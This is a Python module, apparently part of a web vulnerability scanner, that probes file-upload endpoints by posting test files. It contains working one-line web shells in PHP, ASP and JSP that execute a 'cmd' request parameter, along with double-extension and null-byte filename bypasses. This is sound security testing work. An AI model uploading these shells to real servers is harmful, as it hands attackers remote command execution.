"""Insecure file upload detector.

Tests file upload functionality for dangerous file type acceptance,
unrestricted file upload, and server-side execution of malicious payloads.
"""

from typing import Dict, Optional

import requests

from tools.log_utils import get_logger

logger = get_logger("file_upload")

UPLOAD_PARAMS = ["file", "upload", "fileupload", "document", "image"]

DANGEROUS_EXTENSIONS = [
    ".php",
    ".php3",
    ".php4",
    ".php5",
    ".php7",
    ".phps",
    ".phtml",
    ".pht",
    ".asp",
    ".aspx",
    ".jsp",
    ".jspx",
    ".py",
    ".pl",
    ".cgi",
    ".sh",
    ".bash",
    ".exe",
    ".bat",
    ".cmd",
    ".com",
    ".scr",
]

DOUBLE_EXT_PAYLOADS = [
    "shell.php.jpg",
    "shell.php.png",
    "shell.php%00.jpg",
    "shell.php%00.png",
    "shell.jpg.php",
    "shell.jpg.php5",
    "shell.jpg.phtml",
]


def check(
    url: str, param: str = "", sess: Optional[requests.Session] = None, timeout: float = 10.0
) -> Dict:
    if sess is None:
        from tools._session import make_session

        sess = make_session()

    result: Dict = {"vulnerable": False, "findings": []}

    if not url.startswith("http"):
        url = "http://" + url

    upload_param = param if param else "file"

    php_payload = "<?php system($_GET['cmd']); ?>"
    asp_payload = "<% Execute(Request('cmd')) %>"
    jsp_payload = '<% Runtime.getRuntime().exec(Request.getParameter("cmd")); %>'

    test_files = [
        ("shell.php", php_payload, "application/x-php"),
        ("shell.php.jpg", php_payload, "image/jpeg"),
        ("shell.asp", asp_payload, "application/x-asp"),
        ("shell.jsp", jsp_payload, "application/x-jsp"),
        ("shell.php%00.jpg", php_payload, "image/jpeg"),
    ]

    for filename, content, content_type in test_files:
        try:
            files = {upload_param: (filename, content, content_type)}
            r = sess.post(url, files=files, timeout=timeout, allow_redirects=False)
        except Exception as e:
            logger.debug("file_upload test %s: %s", filename, e)
            continue

        if filename.endswith(".php") or filename.endswith(".asp") or filename.endswith(".jsp"):
            if r.status_code == 200:
                finding = {
                    "type": "insecure_file_upload",
                    "endpoint": url,
                    "parameter": upload_param,
                    "filename": filename,
                    "content_type": content_type,
                    "status_code": r.status_code,
                    "issue": f"Dangerous file type {filename} accepted ({r.status_code})",
                    "severity": "high",
                    "confidence": 0.9,
                }
                result["findings"].append(finding)
                result["vulnerable"] = True
                if len(result["findings"]) >= 2:
                    break
        elif r.status_code == 200 and "upload" not in r.text.lower():
            ext = "." + filename.rsplit(".", 1)[-1] if "." in filename else ""
            if ext in DANGEROUS_EXTENSIONS or "php.jpg" in filename or "%00" in filename:
                finding = {
                    "type": "insecure_file_upload",
                    "endpoint": url,
                    "parameter": upload_param,
                    "filename": filename,
                    "status_code": r.status_code,
                    "issue": f"Suspicious file upload accepted: {filename}",
                    "severity": "medium",
                    "confidence": 0.7,
                }
                result["findings"].append(finding)
                result["vulnerable"] = True

    return result
